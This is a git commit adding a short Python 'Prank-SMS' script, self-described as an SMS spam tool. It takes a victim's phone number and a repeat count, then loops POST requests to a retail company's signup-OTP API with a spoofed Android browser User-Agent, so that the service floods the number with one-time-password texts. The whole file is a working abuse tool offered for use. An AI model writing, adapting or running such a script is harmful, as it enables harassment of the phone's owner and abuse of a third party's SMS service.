4ffe445f39a3aadfeca88be36c57a814b7a753c8
iFanpS <69078912+iFanpS@users.noreply.github.com>
2021-02-22 10:44:50 +0700

    Add files via upload

---
+++ Prank-SMS.py
@@ -0,0 +1,36 @@
+#Credit to F4R(RAYA)
+import os,sys,time,requests
+from requests import post
+import subprocess
+ 
+def bersih():
+    os.system("clear")
+ 
+def ulang():
+    pengulangan = input("Try again? (y/n):")
+    if pengulangan == "y":
+       subprocess.call("python sms.py",shell=True)
+    elif pengulangan == "n":
+         print ("exit")
+         sys.exit()
+bersih()
+lambang = """
+================================
+Tools Spam sms by iFanpS
+Usage: (EX: 081*********)
+================================
+"""
+print (lambang)
+no = input("Put phone Number: ")
+jm = int(input("Count for spam: "))
+head = {
+"Connection": "keep-alive",
+"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}
+ 
+dat = {
+"phone": no,
+}
+for i in range(jm):
+    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=head)
+    print ("status: ", r.json())
+ulang()
